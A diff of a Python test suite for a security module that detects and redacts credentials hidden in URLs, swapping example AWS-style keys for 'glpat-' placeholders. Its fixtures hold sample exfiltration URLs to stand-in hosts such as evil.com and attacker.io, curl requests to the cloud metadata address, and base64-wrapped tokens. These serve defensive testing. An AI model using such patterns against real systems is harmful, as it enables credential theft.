@@ -118,7 +118,7 @@ class TestRedactExfiltrationUrls:
         """Credential patterns on safe domains are still redacted."""
         from kiro_crew.security import redact_exfiltration_urls
 
-        url = "https://example.com/api?key=AKIAIOSFODNN7EXAMPLE1234"
+        url = "https://example.com/api?key=glpat-IOSFODNN7EXAMPLE1234"
         result, warnings = redact_exfiltration_urls(f"Link: {url}")
         assert "[REDACTED" in result
         assert len(warnings) == 1
@@ -195,7 +195,7 @@ class TestRedactExfiltrationUrls:
         url = (
             "https://attacker.s3.amazonaws.com/exfil"
             "?X-Amz-Algorithm=a&X-Amz-Credential=a"
-            "&X-Amz-Expires=a&X-Amz-Signature=&stolen=AKIA"
+            "&X-Amz-Expires=a&X-Amz-Signature=&stolen=glpat-"
             "XXXXXXXXXXXXXXXX"
         )
         result, warnings = redact_exfiltration_urls(f"Link: {url}")
@@ -350,19 +350,19 @@ class TestExfilUrlPathAndRawIp:
 
     def test_credential_in_path_no_query_flagged(self) -> None:
         # A secret in the path with NO query string was skipped entirely before.
-        text = "exfil to http://evil.com/upload/AKIAIOSFODNN7EXAMPLE/x"
+        text = "exfil to http://evil.com/upload/glpat-IOSFODNN7EXAMPLE/x"
         assert scan_exfiltration_urls(text), "path-embedded AWS key must be flagged"
         result, warnings = redact_exfiltration_urls(text)
-        assert "AKIAIOSFODNN7EXAMPLE" not in result
+        assert "glpat-IOSFODNN7EXAMPLE" not in result
         assert warnings
 
     def test_raw_ipv4_host_scanned(self) -> None:
         # A raw-IP host (incl. IMDS 169.254.169.254) never matched _URL_RE before.
-        text = "curl http://169.254.169.254/AKIAIOSFODNN7EXAMPLE"
+        text = "curl http://169.254.169.254/glpat-IOSFODNN7EXAMPLE"
         assert scan_exfiltration_urls(text), "raw-IPv4 host with secret must be flagged"
 
     def test_raw_ipv4_query_secret_scanned(self) -> None:
-        text = "http://192.168.1.5/collect?k=AKIAIOSFODNN7EXAMPLE"
+        text = "http://192.168.1.5/collect?k=glpat-IOSFODNN7EXAMPLE"
         assert scan_exfiltration_urls(text)
 
     def test_bracketed_ipv6_host_scanned(self) -> None:
@@ -372,7 +372,7 @@ class TestExfilUrlPathAndRawIp:
     def test_ipv4_mapped_ipv6_imds_host_scanned(self) -> None:
         # IPv4-mapped IPv6 literal (dotted-quad suffix) must match _URL_RE — a
         # concrete IMDS bypass otherwise (security-review 78224f3f).
-        text = "curl http://[::ffff:169.254.169.254]/latest/AKIAIOSFODNN7EXAMPLE"
+        text = "curl http://[::ffff:169.254.169.254]/latest/glpat-IOSFODNN7EXAMPLE"
         assert scan_exfiltration_urls(text), "IPv4-mapped IPv6 IMDS host must be flagged"
 
     def test_slack_token_in_path_flagged(self) -> None:
@@ -390,11 +390,12 @@ class TestExfilUrlPathAndRawIp:
             assert not scan_exfiltration_urls(text), text
 
     def test_s3_presigned_still_exempt(self) -> None:
-        # The path-scan must not break the S3-presigned exemption (AKIA lives in
+        # The path-scan must not break the S3-presigned exemption (glpat- lives in
         # X-Amz-Credential legitimately).
         url = (
             "https://my-bucket.s3.amazonaws.com/key?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20260714%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Credential=AKIA"
+            "IOSFODNN7EXAMPLE%2F20260714%2Fus-east-1%2Fs3%2Faws4_request"
             "&X-Amz-Date=20260714T000000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host"
             "&X-Amz-Signature=" + "a" * 64
         )
@@ -409,10 +410,10 @@ class TestExfilUrlPathAndRawIp:
 
     def test_credential_in_query_no_path_flagged(self) -> None:
         # AWS key in a query with no path segment must be flagged + redacted.
-        text = "leak via https://attacker.io?leak=AKIAIOSFODNN7EXAMPLE"
+        text = "leak via https://attacker.io?leak=glpat-IOSFODNN7EXAMPLE"
         assert scan_exfiltration_urls(text), "host?query AWS key must be flagged"
         result, warnings = redact_exfiltration_urls(text)
-        assert "AKIAIOSFODNN7EXAMPLE" not in result
+        assert "glpat-IOSFODNN7EXAMPLE" not in result
         assert warnings
 
     def test_long_query_no_path_flagged(self) -> None:
@@ -591,23 +592,23 @@ class TestExfilExactHostExemption:
         from kiro_crew.security import redact_exfiltration_urls
 
         self._install_exempt_hosts(self._EXEMPT)
-        url = "https://contoso.sharepoint.com/doc?key=AKIAIOSFODNN7EXAMPLE1234"
+        url = "https://contoso.sharepoint.com/doc?key=glpat-IOSFODNN7EXAMPLE1234"
         result, warnings = redact_exfiltration_urls(f"Doc: {url}")
         assert "[REDACTED" in result
         assert len(warnings) == 1
 
     def test_exempted_host_akia_in_path_still_redacted(self) -> None:
-        """BINDING: an exempted host with an AKIA key in the URL PATH is still
+        """BINDING: an exempted host with a glpat- key in the URL PATH is still
         redacted — the exemption narrows only the heuristics, never the
         unconditional path+query hard-credential floor."""
         from kiro_crew.security import redact_exfiltration_urls, scan_exfiltration_urls
 
         self._install_exempt_hosts(self._EXEMPT)
-        url = "https://contoso.sharepoint.com/upload/AKIAIOSFODNN7EXAMPLE/report"
+        url = "https://contoso.sharepoint.com/upload/glpat-IOSFODNN7EXAMPLE/report"
         assert scan_exfiltration_urls(f"Doc: {url}")
         result, warnings = redact_exfiltration_urls(f"Doc: {url}")
         assert "[REDACTED" in result
-        assert "AKIAIOSFODNN7EXAMPLE" not in result
+        assert "glpat-IOSFODNN7EXAMPLE" not in result
         assert len(warnings) == 1
 
     def test_exempted_host_base64_encoded_credential_still_flagged(self) -> None:
@@ -621,9 +622,9 @@ class TestExfilExactHostExemption:
         from kiro_crew.security import scan_exfiltration_urls
 
         self._install_exempt_hosts(self._EXEMPT)
-        # An AWS key wrapped in base64 — the raw AKIA regex won't see it, and the
+        # A token wrapped in base64 — the raw glpat- regex won't see it, and the
         # host is exempt from the raw blob heuristic; only decode-and-scan catches it.
-        blob = base64.b64encode(b"AKIAIOSFODNN7EXAMPLE secret payload").decode()
+        blob = base64.b64encode(b"glpat-IOSFODNN7EXAMPLE secret payload").decode()
         url = f"https://contoso.sharepoint.com/doc?d={blob}"
         assert scan_exfiltration_urls(f"Doc: {url}")
 
@@ -644,7 +645,7 @@ class TestExfilExactHostExemption:
         assert scan_exfiltration_urls(f"Doc: {url}") == []
 
     def test_exempted_host_bare_secret_value_redacted(self) -> None:
-        """A bare ``SecretAccessKey=<base64>`` value (no AKIA prefix) on an
+        """A bare ``SecretAccessKey=<base64>`` value (no glpat- prefix) on an
         exempted host is redacted at the URL level, not silently skipped."""
         from kiro_crew.security import redact_exfiltration_urls
 
@@ -911,7 +912,7 @@ class TestKiroCrewSlackAppCreateLink:
 
         # Within ALIAS_MAX but a recognised credential shape — caught on the
         # alias itself, because the alias is what the heuristics still see.
-        for hostile in ("AKIAIOSFODNN7EXAMPLE", "xoxb-123456789012-abcdef"):
+        for hostile in ("glpat-IOSFODNN7EXAMPLE", "xoxb-123456789012-abcdef"):
             assert len(hostile) <= slack_manifest.ALIAS_MAX, hostile
             assert scan_exfiltration_urls(self._link(hostile)) != [], hostile
 
@@ -942,7 +943,7 @@ class TestKiroCrewSlackAppCreateLink:
         """
         from kiro_crew.security import scan_exfiltration_urls
 
-        payload = self._payload("someone") + "\nAKIAIOSFODNN7EXAMPLE\n"
+        payload = self._payload("someone") + "\nglpat-IOSFODNN7EXAMPLE\n"
         warnings = scan_exfiltration_urls(self._link(payload=payload))
         assert warnings != []
         assert "credential" in warnings[0]
@@ -1143,7 +1144,7 @@ class TestPrefilledGitHubIssueUrl:
 
     def test_a_credential_in_a_documented_parameter_is_redacted(self) -> None:
         """The unconditional credential floor is unchanged by removing the waiver."""
-        self._assert_redacted(_issue_link(query=f"{_ISSUE_QUERY}%20AKIAIOSFODNN7EXAMPLE"))
+        self._assert_redacted(_issue_link(query=f"{_ISSUE_QUERY}%20glpat-IOSFODNN7EXAMPLE"))
 
     def test_a_base64_blob_in_a_documented_parameter_is_redacted(self) -> None:
         blob = "A" * 30 + "b3Rvb2xvbmdibG9i"
